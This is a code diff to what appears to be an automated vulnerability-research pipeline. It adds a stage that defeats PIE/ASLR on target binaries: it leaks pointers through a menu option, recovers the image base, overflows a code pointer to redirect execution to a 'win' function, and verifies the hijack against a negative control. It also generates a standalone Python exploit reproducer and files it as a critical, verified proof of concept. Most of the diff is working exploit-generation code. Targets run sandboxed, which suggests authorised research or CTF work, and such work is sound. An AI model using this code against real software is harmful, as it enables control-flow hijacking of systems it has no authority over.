@@ -28,6 +28,9 @@ from ...jobs.registry import register_stage
 CHAIN_STAGE = "chain_primitive"
 TOOL_VERSION = "chain-1"
 _NL = b"\n"
+# What a win's output looks like -- a flag banner (NAME{...}), the word flag, or a shell prompt --
+# so the PIE leak-chain confirms on the win actually RUNNING, not on incidental run-to-run noise.
+_WIN_OUT = re.compile(rb"[A-Za-z_][A-Za-z0-9_]{1,15}\{[^}\n]{2,}\}|flag|/bin/sh|\$ |^# ", re.I)
 # CWE -> the aaheg vuln class the discovered primitive represents.
 _VCLASS = {"CWE-415": "double_free", "CWE-416": "uaf", "CWE-122": "heap_overflow",
            "CWE-129": "oob_write"}
@@ -115,15 +118,15 @@ def chain_primitive_stage(ctx) -> dict:
     win = win if win[0] else None
     pie = (target.mitigations or {}).get("pie") == "on"
 
-    # Without a reachable win, or on a PIE image (the win address needs a runtime leak), we cannot
-    # DEMONSTRATE the hijack here -- emit the concrete technique + target recipe as L2 guidance.
-    if win is None or pie:
+    # Without a reachable win we cannot demonstrate a hijack -- emit the technique recipe as L2.
+    # A PIE image is no longer a hard stop: if the target leaks a pointer, _pie_leak_chain recovers
+    # the base in-process and relocates the win address (below).
+    if win is None:
         recipe = _recipe(vclass, win, target_bytes)
-        why = ("no reachable win function (a leak-based libc/one-gadget chain is analyst-gated)"
-               if win is None else "PIE: the win address needs a runtime leak first")
+        why = "no reachable win function (a leak-based libc/one-gadget chain is analyst-gated)"
         _file_recipe(ctx, target, lead, vclass, win, recipe, why)
         ctx.emit("chain.done", payload={"applicable": True, "confirmed": False, "vclass": vclass,
-                 "win": win[0] if win else None, "recipe": recipe.get("technique"), "note": why})
+                 "win": None, "recipe": recipe.get("technique"), "note": why})
         ctx.progress(pct=100, msg=f"L2 recipe for {vclass} (live hijack not demonstrable: {why})")
         return {"metrics": {"chained": False, "vclass": vclass}}
 
@@ -140,6 +143,23 @@ def chain_primitive_stage(ctx) -> dict:
         opts = menu.detect_menu(strings)
         width = _read_width(exe)                          # fixed-width read(fd,buf,W) protocol?
         model = _crawl_menu_model(workdir, exe, opts, width=width) if opts else {}
+
+        if pie:
+            # PIE: the win address is only known at runtime. Recover the base from an in-band leak
+            # and relocate the overwrite in the SAME process (an honest ASLR defeat), confirmed by
+            # the win's output under a negative control.
+            hit = _pie_leak_chain(ctx, target_bytes, exe, win, opts, model, width, workdir)
+            if hit:
+                leak_opt, writer, off, trig, base = hit
+                return _file_pie_l3(ctx, target, lead, vclass, win_name, win_vaddr=win_addr,
+                                    leak_opt=leak_opt, writer=writer, off=off, trig=trig)
+            recipe = _recipe(vclass, win, target_bytes)
+            _file_recipe(ctx, target, lead, vclass, win, recipe,
+                         "PIE: no in-band leak recovered the image base (leak-chain not confirmed)")
+            ctx.emit("chain.done", payload={"applicable": True, "confirmed": False,
+                     "vclass": vclass, "win": win_name, "note": "PIE leak-chain not confirmed"})
+            ctx.progress(pct=100, msg=f"PIE {vclass}: no in-band leak to relocate {win_name}")
+            return {"metrics": {"chained": False, "vclass": vclass, "pie": True}}
 
         helper = materialize_helper()
         capture = make_capture(ctx, helper, str(exe), "stdin", [], 8, sys.executable)
@@ -178,6 +198,120 @@ def chain_primitive_stage(ctx) -> dict:
         return {"metrics": {"chained": False, "vclass": vclass}}
     finally:
         shutil.rmtree(workdir, ignore_errors=True)
+
+
+def _pie_spawn(workdir, exe):
+    """A fresh sandboxed interactive process for the PIE leak-then-chain driver."""
+    import subprocess
+
+    from ..dynamic import sandbox
+
+    def spawn():
+        cmd = sandbox.isolate_prefix(str(workdir), net=False, rw_binds=[str(workdir)]) + [str(exe)]
+        return subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                                stderr=subprocess.STDOUT, cwd=str(workdir),
+                                preexec_fn=sandbox._rlimits(2048, 20, set_as=False))
+    return spawn
+
+
+def _pie_drain(proc, idle=0.25, total=3.0):
+    """Read a process's output until it stalls waiting for input, exits, or `total` elapses."""
+    import os
+    import select
+    import time
+    buf, end = b"", time.time() + total
+    while time.time() < end:
+        r, _, _ = select.select([proc.stdout], [], [], idle)
+        if r:
+            try:
+                chunk = os.read(proc.stdout.fileno(), 4096)
+            except OSError:
+                break
+            if not chunk:
+                break
+            buf += chunk
+        elif proc.poll() is not None:
+            break
+        else:
+            return buf, True                             # stalled: awaiting input
+    return buf, (proc.poll() is None)
+
+
+def _pie_run(spawn, width, leak_opt, writer, off, trig, win_vaddr, target_bytes, *, corrupt):
+    """One in-process leak-then-chain run (an honest ASLR defeat -- the leak and the overwrite
+    happen in the SAME process): drive the leak option, recover the base from what it discloses,
+    overwrite an adjacent code pointer with base+win_vaddr (or a corrupted value for the negative
+    control), trigger, and return (base, trigger_output). base is None when the leak did not
+    recover a base."""
+    from ..fuzz import menu
+    from . import exploit
+    proc = spawn()
+    try:
+        _pie_drain(proc)                                 # first menu
+        proc.stdin.write(menu._scalar(leak_opt.encode(), width)); proc.stdin.flush()
+        out, _ = _pie_drain(proc)
+        vals = [int(x, 16) for x in re.findall(rb"0x[0-9a-fA-F]+", out)]
+        base = exploit.recover_pie_base(vals, target_bytes) if vals else None
+        if not base:
+            return None, b""
+        addr = (base + win_vaddr) if not corrupt else (base + win_vaddr) ^ 0xFFFF
+        proc.stdin.write(menu._scalar(writer.encode(), width)); proc.stdin.flush()
+        _pie_drain(proc)
+        proc.stdin.write(b"A" * off + _p64(addr)); proc.stdin.flush()   # overflow the code pointer
+        _pie_drain(proc)
+        if trig is not None:
+            proc.stdin.write(menu._scalar(trig.encode(), width)); proc.stdin.flush()
+        tout, _ = _pie_drain(proc)
+        return base, tout
+    except (BrokenPipeError, OSError):
+        return None, b""
+    finally:
+        try:
+            proc.kill()
+        except Exception:
+            pass
+
+
+def _pie_leak_chain(ctx, target_bytes, exe, win, opts, model, width, workdir):
+    """PIE control-flow hijack via an in-band leak: find the option that discloses a recoverable
+    image base, then overwrite an adjacent code pointer with base+win_vaddr and confirm the win
+    RUNS (its output appears) -- gated by a negative control (a corrupted address must NOT win).
+    Returns (leak_opt, writer, off, trig, base) or None. Marker-confirmed (no ptrace), because the
+    leak+overwrite must share one live process to defeat real ASLR."""
+    win_name, win_vaddr = win
+    spawn = _pie_spawn(workdir, exe)
+    leak_opt = next((o for o in opts
+                     if _pie_run(spawn, width, o, o, 8, None, win_vaddr, target_bytes,
+                                 corrupt=False)[0]), None)
+    if leak_opt is None:
+        return None
+    writers = [o for o in opts if o in model and "str" in model[o]] or list(opts)
+    triggers = list(opts) + [None]
+    attempts = 0
+    for writer in writers:
+        for off in range(8, 72, 8):
+            for trig in triggers:
+                if ctx.should_cancel() or attempts >= 220:
+                    return None
+                attempts += 1
+                base, pos = _pie_run(spawn, width, leak_opt, writer, off, trig, win_vaddr,
+                                     target_bytes, corrupt=False)
+                if not base:
+                    continue
+                pos_lines = {ln for ln in pos.splitlines() if ln.strip()}
+                # A win-only line that also LOOKS like a win (a flag banner / shell), so leaked-
+                # pointer noise that merely differs run-to-run is not mistaken for success.
+                if not any(_WIN_OUT.search(ln) for ln in pos_lines):
+                    continue
+                _, neg = _pie_run(spawn, width, leak_opt, writer, off, trig, win_vaddr,
+                                  target_bytes, corrupt=True)
+                neg_lines = {ln for ln in neg.splitlines() if ln.strip()}
+                won = [ln for ln in pos_lines - neg_lines if _WIN_OUT.search(ln)]
+                if won:
+                    ctx.progress(msg=f"PIE hijack: leak {leak_opt} -> base -> option {writer} "
+                                     f"writes base+{win_vaddr:#x} at +{off} -> {win_name} ran")
+                    return leak_opt, writer, off, trig, base
+    return None
 
 
 def _search_hijack(ctx, capture, prime, model, writers, triggers, win_addr, *, width=None):
@@ -377,6 +511,112 @@ def _file_l3(ctx, target, lead, vclass, win_name, win_addr, seq, *, blame, write
     ctx.progress(pct=100, msg=f"L3 CONFIRMED: {vclass} -> {win_name} (option {writer} +{off})")
     return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
             "metrics": {"chained": True, "level": "L3", "vclass": vclass, "offset": off}}
+
+
+def _pie_repro_script(win_name, win_vaddr, leak_opt, writer, off, trig) -> bytes:
+    """A self-contained, stdlib-only reproducer: leak -> recover the PIE base from the target's own
+    symbols -> overwrite the code pointer with base+win_vaddr -> trigger. The base recovery mirrors
+    exploit.recover_pie_base (page-offset match, >=2 corroborating leaked slots), so the PoC is a
+    genuine ASLR defeat, not a hardcoded address."""
+    trig_send = "" if trig is None else f"send({trig!r}+'\\n')\n"
+    return (
+        "#!/usr/bin/env python3\n"
+        "# PIE leak-then-chain reproducer (stdlib only). Usage: python3 exploit.py ./target.bin\n"
+        "import subprocess, select, os, re, struct, sys, time, collections\n"
+        f"WIN_VADDR={win_vaddr:#x}; LEAK={leak_opt!r}; WRITER={writer!r}; OFF={off}\n"
+        "EXE=sys.argv[1] if len(sys.argv)>1 else './target.bin'\n"
+        "def syms(path):\n"
+        "  d=open(path,'rb').read(); a=collections.defaultdict(list)\n"
+        "  is64=d[4]==2; e='<' if d[5]==1 else '>'\n"
+        "  sh_off,=struct.unpack_from(e+'Q',d,0x28); shs,shn=struct.unpack_from(e+'HH',d,0x3a)\n"
+        "  secs=[struct.unpack_from(e+'IIQQQQIIQQ',d,sh_off+i*shs) for i in range(shs and shn)]\n"
+        "  for typ in (2,11):\n"
+        "    for s in secs:\n"
+        "      if s[1]!=typ or not s[9]: continue\n"
+        "      st=secs[s[6]]; blob=d[st[4]:st[4]+st[5]]\n"
+        "      for i in range(s[5]//s[9]):\n"
+        "        o=s[4]+i*s[9]; info=d[o+4]; val,=struct.unpack_from(e+'Q',d,o+8)\n"
+        "        t=info&0xf\n"
+        "        if t in (1,2) and val: a[val&0xfff].append(val)\n"
+        "    if a: break\n"
+        "  return a\n"
+        "def recover(vals, anchors):\n"
+        "  sup=collections.defaultdict(set)\n"
+        "  for v in vals:\n"
+        "    if 0x1000<=v<=0x7fffffffffff:\n"
+        "      for va in anchors.get(v&0xfff,()):\n"
+        "        b=v-va\n"
+        "        if b>0 and b&0xfff==0: sup[b].add(v)\n"
+        "  best=max(sup, key=lambda b:len(sup[b]), default=None)\n"
+        "  return best if best is not None and len(sup[best])>=2 else None\n"
+        "p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
+        "def drain(t=0.4):\n"
+        "  b=b''; end=time.time()+t\n"
+        "  while time.time()<end:\n"
+        "    r,_,_=select.select([p.stdout],[],[],0.2)\n"
+        "    if r:\n"
+        "      c=os.read(p.stdout.fileno(),4096)\n"
+        "      if not c: break\n"
+        "      b+=c\n"
+        "    elif p.poll() is not None: break\n"
+        "  return b\n"
+        "def send(s): p.stdin.write(s.encode() if isinstance(s,str) else s); p.stdin.flush()\n"
+        "drain(); send(LEAK+'\\n'); out=drain()\n"
+        "vals=[int(x,16) for x in re.findall(rb'0x[0-9a-fA-F]+',out)]\n"
+        "base=recover(vals, syms(EXE))\n"
+        "assert base, 'no base recovered from leak'\n"
+        "send(WRITER+'\\n'); drain()\n"
+        "send(b'A'*OFF+struct.pack('<Q',base+WIN_VADDR)); drain()\n"
+        f"{trig_send}"
+        "sys.stdout.write(drain().decode('latin-1','ignore'))\n"
+    ).encode()
+
+
+def _file_pie_l3(ctx, target, lead, vclass, win_name, *, win_vaddr, leak_opt, writer, off, trig):
+    """File a confirmed PIE leak-chain as an L3 verified PoC (bundle = target + a runnable
+    leak-then-chain reproducer)."""
+    import json as _json
+
+    from ...db.dao import FindingDAO, PocDAO
+    from . import bundle
+    script = _pie_repro_script(win_name, win_vaddr, leak_opt, writer, off, trig)
+    input_sha = ctx.put_artifact("pie-chain-repro", data=script)
+    meta = {"target_sha256": target.sha256, "arch": target.arch, "level": "L3",
+            "exploit": f"{vclass}->control-flow (PIE, leak-relocated)", "target": win_name,
+            "win_vaddr": hex(win_vaddr), "leak_option": leak_opt, "tool_version": TOOL_VERSION}
+    data = bundle.build(ctx.content.path(target.sha256).read_bytes(), script, meta, b"",
+                        "stdin", [], None,
+                        primitive={"type": vclass, "target": win_name, "offset": off,
+                                   "confirmed": True, "note": "PIE leak-relocated"})
+    bundle_sha = ctx.put_artifact("poc-bundle", data=data, meta={"level": "L3", "verified": True})
+    poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L3", verified=True,
+                                     signal_name=None, input_sha=input_sha, bundle_sha=bundle_sha)
+    trg = "program exit / normal use" if trig is None else f"menu option {trig}"
+    eff = (f"working PIE exploit ({vclass} -> control-flow hijack): leaked a pointer via option "
+           f"{leak_opt}, recovered the image base, then option {writer} overwrote an adjacent code "
+           f"pointer at +{off} with base+{win_vaddr:#x} ({win_name}); {trg} ran it. Shown in "
+           f"ONE process (a real ASLR defeat) and confirmed by the win's output under a passing "
+           f"negative control (a corrupted address does not win).")
+    fd = FindingDAO(ctx.conn)
+    cand = {"cwe": lead.cwe, "title": "Control-flow hijack (demonstrated): L3 PIE leak-chain",
+            "severity": "critical", "detector": "chain_primitive", "state": "poc-backed",
+            "confidence": 0.99, "authoritative": True, "title_only": True,
+            "dedup_key": f"chain:{vclass}:pie:{target.id}", "site_detail": win_name,
+            "evidence": [{"channel": "effects", "detail": _json.dumps([{
+                "kind": "rce", "title": "Control-flow hijack (PIE, ASLR defeated)",
+                "status": "demonstrated", "detail": eff,
+                "proof": {"type": "bundle", "sha": bundle_sha, "input_sha": input_sha,
+                          "note": eff}}])}]}
+    fd.upsert(target.id, target.case_id, cand)
+    fid = fd.id_for_dedup(target.id, cand["dedup_key"])
+    if fid:
+        PocDAO(ctx.conn).set_finding(poc_id, fid)
+    ctx.emit("chain.done", payload={"applicable": True, "confirmed": True, "vclass": vclass,
+             "win": win_name, "leak": leak_opt, "writer": writer, "offset": off, "trigger": trig,
+             "pie": True, "bundle": bundle_sha})
+    ctx.progress(pct=100, msg=f"L3 CONFIRMED (PIE): leak {leak_opt} -> base -> {win_name}")
+    return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
+            "metrics": {"chained": True, "level": "L3", "vclass": vclass, "pie": True, "off": off}}
 
 
 def _file_recipe(ctx, target, lead, vclass, win, recipe, why) -> None:
